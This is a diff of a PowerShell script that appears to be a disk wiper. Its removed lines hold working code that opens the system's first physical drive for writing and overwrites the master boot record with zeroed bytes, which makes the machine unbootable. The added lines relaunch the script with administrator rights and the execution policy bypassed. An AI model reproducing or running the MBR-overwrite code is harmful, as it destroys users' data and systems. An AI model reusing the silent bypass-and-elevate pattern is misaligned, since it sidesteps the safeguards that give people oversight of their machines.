@@ -8,19 +8,15 @@ if ($runAsAdmin -ne "Y" -and $runAsAdmin -ne "y") {
     Exit
 }
 
+# Create a new PowerShell process with elevated privileges
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = 'powershell'
+$psi.Arguments = "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
+$psi.Verb = 'RunAs'
+
 try {
-    $MasterBootRecord = [System.IO.File]::Open("\\.\PhysicalDrive0", 'Open', 'ReadWrite', 'None')
-
-    $mbrData = New-Object byte[] $MBR_SIZE
-
-    $MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
-    Start-Sleep -Milliseconds 5000
-    $MasterBootRecord.Close()
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
 }
 catch {
-    # Handle the exception if needed
-    Write-Host "An error occurred: $_"
-    if ($MasterBootRecord -ne $null) {
-        $MasterBootRecord.Close()
-    }
+    Write-Host "Failed to launch the script with elevated privileges: $_"
 }
